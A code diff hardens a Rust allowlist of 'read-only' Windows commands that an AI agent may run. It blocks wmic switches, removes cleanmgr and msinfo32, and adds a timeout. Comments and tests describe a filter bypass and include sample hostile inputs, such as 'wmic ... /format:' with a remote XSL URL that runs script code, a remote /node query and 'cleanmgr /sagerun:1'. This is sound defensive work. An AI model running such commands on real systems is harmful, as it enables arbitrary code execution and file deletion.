@@ -1,11 +1,8 @@
 use serde::Serialize;
 use std::collections::HashSet;
-use std::process::Command;
-#[cfg(target_os = "windows")]
-use std::os::windows::process::CommandExt;
 
 use crate::error::NiTriTeError;
-use crate::maintenance::commands::decode_output;
+use crate::maintenance::commands::execute_system_command;
 
 #[derive(Debug, Clone, Serialize)]
 pub struct SafeCommandResult {
@@ -21,7 +18,13 @@ fn safe_commands() -> HashSet<&'static str> {
         "systeminfo", "tasklist", "ipconfig", "netstat", "ping", "tracert",
         "nslookup", "hostname", "ver", "wmic", "driverquery", "whoami",
         "powercfg", "Get-Process", "Get-Service", "Get-NetAdapter",
-        "Get-ComputerInfo", "Get-Volume", "cleanmgr", "msinfo32",
+        "Get-ComputerInfo", "Get-Volume",
+        // `cleanmgr` et `msinfo32` ONT ETE RETIRES : ce sont des outils
+        // graphiques, ils n'ecrivent rien sur stdout (donc rien a donner a
+        // l'agent) et `cmd /C` attend leur fermeture par l'utilisateur. Pire,
+        // leurs commutateurs agissent : `cleanmgr /sagerun:1` SUPPRIME des
+        // fichiers, `msinfo32 /report <chemin>` ecrit ou on lui dit -- ni l'un
+        // ni l'autre n'est « lecture seule » comme cette liste le promet.
     ].into_iter().collect()
 }
 
@@ -59,6 +62,22 @@ fn validate_command_args(first_word: &str, args: &[&str]) -> Result<(), NiTriTeE
                 if dangerous_verbs.contains(&lower.as_str()) {
                     return Err(NiTriTeError::CommandDenied(
                         format!("wmic: sous-commande '{}' interdite (opération mutante)", arg)
+                    ));
+                }
+                // Refuser TOUT commutateur global de wmic. Une requete en
+                // lecture s'ecrit `wmic <alias> get <proprietes>` : elle n'a
+                // besoin d'aucun `/`. Les commutateurs, eux, sortent du cadre
+                // « lecture seule » que cette liste promet :
+                //   /format:<url.xsl>  execute le JScript/VBScript du XSL
+                //                      (LOLBAS, MITRE ATT&CK T1220) -- donc
+                //                      execution de code arbitraire ;
+                //   /output: /append:  ecrivent un fichier ou on leur dit ;
+                //   /node: /user: /password:  interrogent une AUTRE machine.
+                // Aucun n'etait bloque : seuls les verbes EXACTS ci-dessus
+                // l'etaient, et `/format:` n'en est pas un.
+                if lower.starts_with('/') {
+                    return Err(NiTriTeError::CommandDenied(
+                        format!("wmic: commutateur '{}' interdit (lecture seule uniquement)", arg)
                     ));
                 }
             }
@@ -106,21 +125,20 @@ pub fn is_safe(command: &str) -> Result<(), NiTriTeError> {
 pub fn execute_safe(command: &str) -> Result<SafeCommandResult, NiTriTeError> {
     is_safe(command)?;
 
-    let output = Command::new("cmd")
-        .args(["/C", command])
-        .creation_flags(0x08000000)
-        .output()
-        .map_err(|e| NiTriTeError::System(e.to_string()))?;
+    // Timeout de 60 s, comme partout ailleurs dans le projet. Sans lui, une
+    // commande de la liste qui ne rend jamais la main -- `ping -t`, `tracert`
+    // vers un reseau qui ne repond pas -- bloquait ce thread pour le reste de
+    // la session, en silence. `execute_system_command` tue le processus au
+    // depassement et decode deja la sortie OEM (systeminfo, driverquery,
+    // tasklist : « Nom d'hôte », « Mode de démarrage »... alimentent aussi le
+    // contexte de l'agent IA, pas seulement l'interface).
+    let result = execute_system_command("cmd", &["/C", command], 60)?;
 
-    // decode_output : systeminfo/driverquery/tasklist (whitelistés ci-dessus)
-    // sont les cas classiques OEM — confirmé en direct sur cette machine
-    // (« Nom d'hôte », « Mode de démarrage », « État » corrompus). Cette
-    // sortie alimente aussi le contexte de l'agent IA, pas seulement l'UI.
     Ok(SafeCommandResult {
         command: command.to_string(),
-        success: output.status.success(),
-        stdout: decode_output(&output.stdout),
-        stderr: decode_output(&output.stderr),
+        success: result.success,
+        stdout: result.stdout,
+        stderr: result.stderr,
     })
 }
 
@@ -154,6 +172,37 @@ mod tests {
     #[test]
     fn allows_wmic_readonly_query() {
         assert!(is_safe("wmic cpu get name").is_ok());
+    }
+
+    // c-audit : `wmic ... /format:<url.xsl>` passait TOUT le filtre (aucun
+    // caractere interdit, aucun verbe mutant) et wmic.exe executait le
+    // JScript du XSL distant -- execution de code arbitraire derriere une
+    // liste annoncee « lecture seule ».
+    #[test]
+    fn blocks_wmic_format_xsl() {
+        assert!(is_safe("wmic process get name /format:https://exemple.invalid/x.xsl").is_err());
+    }
+
+    #[test]
+    fn blocks_wmic_output_to_file() {
+        assert!(is_safe("wmic cpu get name /output:x.txt").is_err());
+    }
+
+    #[test]
+    fn blocks_wmic_remote_node() {
+        assert!(is_safe("wmic /node:10.0.0.5 os get caption").is_err());
+    }
+
+    // Outils graphiques retires de la liste : aucune sortie a donner a
+    // l'agent, et leurs commutateurs agissent (`cleanmgr /sagerun:1` supprime).
+    #[test]
+    fn blocks_cleanmgr() {
+        assert!(is_safe("cleanmgr /sagerun:1").is_err());
+    }
+
+    #[test]
+    fn blocks_msinfo32_report() {
+        assert!(is_safe("msinfo32 /report x.nfo").is_err());
     }
 
     #[test]
